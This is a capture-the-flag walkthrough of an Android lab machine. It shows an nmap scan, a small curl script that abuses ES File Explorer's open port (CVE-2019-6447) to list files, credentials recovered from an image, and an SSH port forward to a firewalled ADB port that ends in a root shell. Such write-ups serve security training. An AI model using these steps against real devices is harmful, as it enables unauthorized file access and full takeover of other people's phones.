# Explore

First we start with `nmap`

```
# Nmap 7.92 scan initiated Sat Aug 21 15:22:43 2021 as: nmap -vvv -p 2222,35747,42135,59777 -sCV -oA init 10.10.10.247
Nmap scan report for box.ip (10.10.10.247)
Host is up, received conn-refused (0.099s latency).
Scanned at 2021-08-21 15:22:44 +07 for 103s

PORT      STATE SERVICE REASON  VERSION
2222/tcp  open  ssh     syn-ack (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|   2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqK2WZkEVE0CPTPpWoyDKZkHVrmffyDgcNNVK3PkamKs3M8tyqeFBivz4o8i9Ai8UlrVZ8mztI3qb+cHCdLMDpaO0ghf/50qYVGH4gU5vuVN0tbBJAR67ot4U+7WCcdh4sZHX5NNatyE36wpKj9t7n2XpEmIYda4CEIeUOy2Mm3Es+GD0AAUl8xG4uMYd2rdrJrrO1p15PO97/1ebsTH6SgFz3qjZvSirpom62WmmMbfRvJtNFiNJRydDpJvag2urk16GM9a0buF4h1JCGwMHxpSY05aKQLo8shdb9SxJRa9lMu3g2zgiDAmBCoKjsiPnuyWW+8G7Vz7X6nJC87KpL
35747/tcp open  unknown syn-ack
| fingerprint-strings:
[snip]
42135/tcp open  http    syn-ack ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open  http    syn-ack Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
[snip]
Service Info: Device: phone

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 21 15:24:27 2021 -- 1 IP address (1 host up) scanned in 103.84 seconds
```

The "ES File Explorer" seems interesting and matches the name of the box so we dig further into it. Looking up "es file explorer exploit" gives us a [reference](https://www.rapid7.com/db/modules/auxiliary/scanner/http/es_file_explorer_open_port/) to exploitation with the metasploit module `scanner/http/es_file_explorer_open_port`, as well as an [exploit script](https://www.exploit-db.com/exploits/50070), both seeming to exploit the same CVE-2019-6447. However, since neither exploit allows us to list specific directories, I wrote a small script for exploring the file system.

```sh
#!/bin/bash
while true; do
  printf ">>> "
  read -r path
  curl -X POST "http://10.10.10.247:59777/$path" -H "Content-Type: application/json" --data "{\"command\": \"listFiles\"}"
  echo
done
```

With this, I started exploring `/sdcard` and found the file `/sdcard/DCIM/creds.jpg` which holds credentials for "kristi" with the password `Kr1sT!5h@Rp3xPl0r3!`. With the found credentials, we should be able to log into SSH on port 2222 and get a shell as "u0_a76".

Looking at open ports with `ss` ...

```sh
:/ $ ss -tlpn
State       Recv-Q Send-Q Local Address:Port               Peer Address:Port
LISTEN      0      50           *:59777                    *:*
LISTEN      0      50           *:2222                     *:*                   users:(("ss",pid=31554,fd=75),("sh",pid=30430,fd=75),("droid.sshserver",pid=3342,fd=75))
LISTEN      0      4            *:5555                     *:*
LISTEN      0      10           *:42135                    *:*
LISTEN      0      50       [::ffff:10.10.10.247]:36411                    *:*
LISTEN      0      8       [::ffff:127.0.0.1]:41789                    *:*
```

... we see some known ports listening on IPv4: 2222 for SSH, 42135 and 59777 for ES file explorer, and port 5555, whose program we don't know. Looking up port 5555 on Android, we find that this port is open by ADB and is a vulnerability on many Android devices.

We're now aiming to exploit ADB on port 5555. However, in attempting to connect, we're unable to connect to ADB from our attacking machine. Port 5555 didn't appear in our `nmap` result either so we can assume it's filtered by a firewall. To reach ADB on port 5555, we can port forward using our SSH connection.

```sh
ssh kristi@10.10.10.247 -p 2222 -L 5555:127.0.0.1:5555 -N
```

After that, we can connect to ADB

```
$ adb connect 127.0.0.1
connected to 127.0.0.1:5555
$ adb shell
x86_64:/ $ su
:/ # whoami
root
```

With that, we should have a root shell.
